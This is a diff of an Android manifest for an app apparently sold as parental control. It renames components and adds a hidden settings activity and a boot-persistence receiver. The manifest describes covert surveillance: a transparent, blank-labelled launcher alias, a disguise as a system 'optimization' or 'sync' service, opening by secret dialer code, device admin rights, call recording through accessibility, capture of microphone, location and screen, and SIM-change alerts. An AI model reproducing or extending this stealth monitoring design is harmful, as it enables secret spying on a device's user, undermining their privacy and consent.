@@ -52,7 +52,7 @@
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <application
-        android:name=".OptimizationApp"
+        android:name="com.example.parentalcontrol.core.base.OptimizationApp"
         android:allowBackup="true"
         android:icon="@android:drawable/ic_menu_preferences"
         android:label="@string/app_name"
@@ -63,7 +63,7 @@
         tools:replace="android:label">
 
         <activity
-            android:name=".MainActivity"
+            android:name="com.example.parentalcontrol.core.ui.MainActivity"
             android:excludeFromRecents="true"
             android:exported="true"
             android:theme="@style/Theme.SyncService" />
@@ -75,7 +75,7 @@
             android:exported="true"
             android:icon="@android:drawable/ic_menu_preferences"
             android:label="@string/app_name"
-            android:targetActivity=".MainActivity">
+            android:targetActivity="com.example.parentalcontrol.core.ui.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -89,7 +89,7 @@
             android:exported="true"
             android:icon="@color/transparent"
             android:label=" "
-            android:targetActivity=".MainActivity">
+            android:targetActivity="com.example.parentalcontrol.core.ui.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -113,7 +113,7 @@
 
         <!-- منفذ استقبال رمز الاتصال السري (v29 - Trampoline Activity) -->
         <activity
-            android:name=".SecretCodeActivity"
+            android:name="com.example.parentalcontrol.features.security_and_stealth.controllers.SecretCodeActivity"
             android:theme="@android:style/Theme.NoDisplay"
             android:excludeFromRecents="true"
             android:exported="true"
@@ -124,9 +124,16 @@
             </intent-filter>
         </activity>
 
+        <!-- واجهة الإعدادات المخفية للوالد -->
+        <activity
+            android:name="com.example.parentalcontrol.features.security_and_stealth.controllers.HiddenSettingsActivity"
+            android:theme="@style/Theme.SyncService"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
         <!-- خدمة المراقبة الأساسية -->
         <service
-            android:name=".MonitoringForegroundService"
+            android:name="com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="location|dataSync|microphone|mediaProjection" />
@@ -140,7 +147,7 @@
 
         <!-- خدمة المراقبة (JobService) -->
         <service
-            android:name=".ServiceWatchdogJobService"
+            android:name="com.example.parentalcontrol.features.service_watchdog.services.ServiceWatchdogJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:exported="true" />
 
@@ -157,7 +164,7 @@
 
         <!-- مستقبل مسؤول الجهاز (Device Admin) -->
         <receiver
-            android:name=".MyDeviceAdminReceiver"
+            android:name="com.example.parentalcontrol.features.security_and_stealth.controllers.MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
             <meta-data
@@ -181,7 +188,7 @@
 
         <!-- مستقبل إعادة التشغيل -->
         <receiver
-            android:name=".ServiceRestartReceiver"
+            android:name="com.example.parentalcontrol.features.service_watchdog.controllers.ServiceRestartReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
@@ -190,8 +197,18 @@
             </intent-filter>
         </receiver>
 
+        <!-- مستقبل الإقلاع المخصص -->
         <receiver
-            android:name=".SecretCodeReceiver"
+            android:name="com.example.parentalcontrol.features.service_watchdog.controllers.BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.example.parentalcontrol.features.security_and_stealth.controllers.SecretCodeReceiver"
             android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
@@ -216,7 +233,7 @@
 
         <!-- خدمة إمكانية الوصول لتسجيل المكالمات -->
         <service
-            android:name=".AppAccessibilityService"
+            android:name="com.example.parentalcontrol.features.accessibility_monitoring.services.AppAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -228,7 +245,7 @@
         </service>
 
         <!-- مستقبل تنبيهات تغيير الشريحة -->
-        <receiver android:name=".SimChangeReceiver" android:exported="true">
+        <receiver android:name="com.example.parentalcontrol.features.security_and_stealth.controllers.SimChangeReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.SIM_STATE_CHANGED" />
             </intent-filter>
